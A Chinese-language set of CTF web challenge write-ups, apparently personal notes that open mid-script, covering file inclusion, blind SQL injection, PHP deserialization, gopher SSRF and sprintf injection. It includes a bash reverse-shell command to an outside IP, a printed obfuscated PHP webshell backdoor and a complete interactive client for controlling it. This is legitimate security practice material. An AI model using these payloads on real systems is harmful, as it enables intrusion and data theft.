        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

![image](http://note.youdao.com/yws/res/2013/6679FDC097C942F1ABD2D5D07B04CB71)

可以看见在199个文件时上传成功，payload:

```
http://train.overflow.host:20003/?file=/tmp/g&1=system(%27cat%20/836b85d4-e871-4cb0-8b71-db1e2e735195.flag%27);
```

## wangyihang inclusion -- 04

下载源码，发现登陆可绕过
```
<?php
    $admin_hash = "df650edd89a1abfb417124133daf4c103e6d2e97";
	if(isset($_POST['username']) && isset($_POST['password'])){
		$username = $_POST['username'];
		$password = $_POST['password'];
		if ($username === "admin" && sha1(md5($password)) === $admin_hash){
			echo '<script>alert("Login seccess!");</script>';
		}else{
			if (isset($_GET['debug'])){
				if($_GET['debug'] === 'hitctf'){
					$logfile = "log/".$username.".log";
					$content = $password;
					file_put_contents($logfile, $content);

				}else{
					echo '<script>alert("Login failed!");</script>';
				}
			}else{
				echo '<script>alert("Login failed!");</script>';
			}
		}
	}else{
		echo '<script>alert("Please input username and password!");</script>';
	}
?>
```

将前几题的c.phar进行url编码，post

![image](http://note.youdao.com/yws/res/2026/5A7D952E3A9946128169E7174C6ACE41)

![image](http://note.youdao.com/yws/res/2024/E51D14DED22949B7BF5F918E38432F2F)

访问?page=phar://log/admin.log/boc&c=phpinfo();

## wangyihang rce-01

`/etc/passwd | bash -c "bash -i >& /dev/tcp/118.24.240.40/7777  0>&1"`

## d-5-web5

盲注，二分法，union、and、or等被过滤，空格也被过滤，空格可以用()代替

https://www.cnblogs.com/20175211lyz/p/11435298.html

```
import hashlib
import string
import requests

url='http://39.100.39.157:8303/index.php'

payload = {
    "id" : ""
}
result = ""
for i in range(1,100):
    l = 33
    r =130
    mid = (l+r)>>1
    while(l<r):
        payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
        html = requests.post(url,data=payload)
        print(payload)
        if "Hello" in html.text:
            l = mid+1
        else:
            r = mid
        mid = (l+r)>>1
    if(chr(mid)==" "):
        break
    result = result + chr(mid)
    print(result)
print("flag: " ,result)


```

自己写的脚本，不用二分法也可以，就是慢一点

```
import hashlib
import string
import requests

url='http://39.100.39.157:8303/index.php'

payload = {
    "id" : ""
}

temp = ''
for i in xrange(1, 50):
    for p in xrange(32, 126+1):
        payload['id'] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))={1})".format(i,p)
        
        html = requests.post(url,data=payload).text
        if 'hello' in html:
            temp += chr(p)
            print(temp)
            break
```

## web-6

.index.php源码

![image](http://note.youdao.com/yws/res/1045/3710A95B9A4E44F1B137FA209E6232BA)

## ZJCTF NiZhuanSiWei

```
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

构造?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php

传入text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 绕过welcome to the zjctf

用filter读取源码

```
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  

$file = new Flag();
$file->file = 'flag.php';
echo serialize($file);
```

最终：http://45.13.244.211/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

## 5.1日 web2

https://forum.90sec.com/t/topic/397

https://github.com/tarunkant/Gopherus

无需密码认证时直接发送TCP/IP数据包，gopher协议进行mysql认证

![image](http://note.youdao.com/yws/res/1567/C6E7229E2D2A4908A212C0CF77D977A5)

需要进行url编码 
![image](http://note.youdao.com/yws/res/1570/C5EE46FD5BE442D589A47DC19D665DFA)

sql ：

1.show databases;

2.select group_concat(table_name) from information_schema.tables where table_schema='fla4441111g'

3.SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE table_schema = 'fla4441111g' AND table_name = 'F1111llllggggg'

4.select flag from fla4441111g.F1111llllggggg

## Web_php_wrong_nginx_config(攻防世界)

1.robots.txt发现hack.php和hint.php,hint.php提示etc/nginx/sites-enabled/site.conf

2.利用/admin/admin.php?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&ext=读取文件内容，发现web-img存在文件遍历

![image](http://note.youdao.com/yws/res/1585/B505AF8F2C854B118B74F97775C9FCB2)

3.访问http://124.126.19.106:59345/web-img../var/www/，下载hack.php.bak，打印$f得到源码

```
<?php
$kh="42f7";
$kf="e9ac";
function x($t,$k) {
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for ($i=0;$i<$l;) {
		for ($j=0;($j<$c&&$i<$l);$j++,$i++) {
			$o.=$t {
				$i
			}
			^$k {
				$j
			}
			;
		}
	}
	return $o;
}
$r=$_SERVER;
$rr=@$r["HTTP_REFERER"];
$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
if($rr&&$ra) {
	$u=parse_url($rr);
	parse_str($u["query"],$q);
	$q=array_values($q);
	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
	if($q&&$m) {
		@session_start();
		$s=&$_SESSION;
		$ss="substr";
		$sl="strtolower";
		$i=$m[1][0].$m[1][1];
		$h=$sl($ss(md5($i.$kh),0,3));
		$f=$sl($ss(md5($i.$kf),0,3));
		$p="";
		for ($z=1;$z<count($m[1]);$z++)$p.=$q[$m[2][$z]];
		if(strpos($p,$h)===0) {
			$s[$i]="";
			$p=$ss($p,3);
		}
		if(array_key_exists($i,$s)) {
			$s[$i].=$p;
			$e=strpos($s[$i],$f);
			if($e) {
				$k=$kh.$kf;
				ob_start();
				@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
				$o=ob_get_contents();
				ob_end_clean();
				$d=base64_encode(x(gzcompress($o),$k));
				print("<$k>$d</$k>");
				@session_destroy();
			}
		}
	}
}

```

4.找到一个后门利用的脚本，根据题目修改后的脚本(修改了密钥和url)如下:

```
# encoding: utf-8

from random import randint,choice
from hashlib import md5
import urllib
import string
import zlib
import base64
import requests
import re

def choicePart(seq,amount):
    length = len(seq)
    if length == 0 or length < amount:
        print 'Error Input'
        return None
    result = []
    indexes = []
    count = 0
    while count < amount:
        i = randint(0,length-1)
        if not i in indexes:
            indexes.append(i)
            result.append(seq[i])
            count += 1
            if count == amount:
                return result

def randBytesFlow(amount):
    result = ''
    for i in xrange(amount):
        result += chr(randint(0,255))
    return  result

def randAlpha(amount):
    result = ''
    for i in xrange(amount):
        result += choice(string.ascii_letters)
    return result

def loopXor(text,key):
    result = ''
    lenKey = len(key)
    lenTxt = len(text)
    iTxt = 0
    while iTxt < lenTxt:
        iKey = 0
        while iTxt<lenTxt and iKey<lenKey:
            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
            iTxt += 1
            iKey += 1
    return result


def debugPrint(msg):
    if debugging:
        print msg

# config
debugging = False
keyh = "42f7" # $kh
keyf = "e9ac" # $kf
xorKey = keyh + keyf
url = 'http://111.198.29.45:46283/hack.php'
defaultLang = 'zh-CN'
languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']
proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug

sess = requests.Session()

# generate random Accept-Language only once each session
langTmp = choicePart(languages,3)
indexes = sorted(choicePart(range(1,10),3), reverse=True)

acceptLang = [defaultLang]
for i in xrange(3):
    acceptLang.append(langTmp[i] % (indexes[i],))
acceptLangStr = ','.join(acceptLang)
debugPrint(acceptLangStr)

init2Char = acceptLang[0][0] + acceptLang[1][0] # $i
md5head = (md5(init2Char + keyh).hexdigest())[0:3]
md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))
debugPrint('$i is %s' % (init2Char))
debugPrint('md5 head: %s' % (md5head,))
debugPrint('md5 tail: %s' % (md5tail,))

# Interactive php shell
cmd = raw_input('phpshell > ')
while cmd != '':
    # build junk data in referer
    query = []
    for i in xrange(max(indexes)+1+randint(0,2)):
        key = randAlpha(randint(3,6))
        value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))
        query.append((key, value))
    debugPrint('Before insert payload:')
    debugPrint(query)
    debugPrint(urllib.urlencode(query))

    # encode payload
    payload = zlib.compress(cmd)
    payload = loopXor(payload,xorKey)
    payload = base64.urlsafe_b64encode(payload)
    payload = md5head + payload

    # cut payload, replace into referer
    cutIndex = randint(2,len(payload)-3)
    payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
    iPiece = 0
    for i in indexes:
        query[i] = (query[i][0],payloadPieces[iPiece])
        iPiece += 1
    referer = url + '?' + urllib.urlencode(query)
    debugPrint('After insert payload, referer is:')
    debugPrint(query)
    debugPrint(referer)

    # send request
    r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies)
    html = r.text
    debugPrint(html)

    # process response
    pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))
    output = pattern.findall(html)
    if len(output) == 0:
        print 'Error,  no backdoor response'
        cmd = raw_input('phpshell > ')
        continue
    output = output[0]
    debugPrint(output)
    output = output.decode('base64')
    output = loopXor(output,xorKey)
    output = zlib.decompress(output)
    print output
    cmd = raw_input('phpshell > ')

```

![image](http://note.youdao.com/yws/res/1601/6724CDBAFFC24F0E8C96A27241F1A5A5)

## 安恒4月赛-Ezunserialize

```
<?php
// show_source("index.php");
function write($data)
{
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}
function read($data)
{
    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}
class A
{
    public $username;
    public $password;
    public function __construct($a, $b)
    {
        $this->username = $a;
        $this->password = $b;
    }
}
class B
{
    public $b = 'gqy';
    public function __destruct()
    {
        $c = 'a'.$this->b;
        echo $c;
    }
}
class C
{
    public $c;
    public function __toString()
    {
        //flag.php
        echo file_get_contents($this->c);
        return 'nice';
    }
}

$a = new A();
// //省略了存储序列化数据的过程,下面是取出来并反序列化的操作
$b = unserialize(read(write(serialize($a))));
```

构造pop链条

```
$b = new B();
$c = new C();
$c->c = 'flag.php';
$b->b = $c; //当B对象里的b属性字符串拼接了其他类型的变量时，会自动调用c对象的tostring方法
$x = serialize($b);
echo strlen($x); //序列化后的长度为55
echo $x; //O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}} 
```

当A对象通过write和read函数后，最后的变量的长度不符，存在字符串逃逸的漏洞
![image](http://note.youdao.com/yws/res/1619/7110947EA50946B7B35305A57CAF74B7)

*左右都有不可见字符%00，意味着chr(0).'*'.chr(0)为3个字节

构造payload:
```
$a = new A('\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0', '1";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}};}');
```

![image](http://note.youdao.com/yws/res/1633/F98F9F7D96BA4125A7572E67354631DC)

打印出的结果，利用字段逃逸补全后面缺的48-24个字节的位置，让password属性执行B对象

## babytricks

提示

```
select * from user where user='$user' and passwd='%s'
```

sprinf格式化字符串漏洞

它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空

https://www.cnblogs.com/test404/p/7821884.html

%1$将单引号给吞了，从而实现类似于’转义单引号的注入,前面经过测试，过滤了or 我们可以用异或来进行sql注入

payload: user=%1$&passwd=^1^1#

查询用户名：user=%1$&passwd=^(ascii(substr((user),1,1))>1)#

查询密码：user=%1$&passwd=^(ascii(substr((passwd),1,1))>1)#

得出密码后登陆后台
preg_match $0 代表完整的模式匹配文本
![image](http://note.youdao.com/yws/res/1652/49D7CA13BE204AD3BC758E4AF5575C09)

https://blog.csdn.net/SopRomeo/article/details/105849403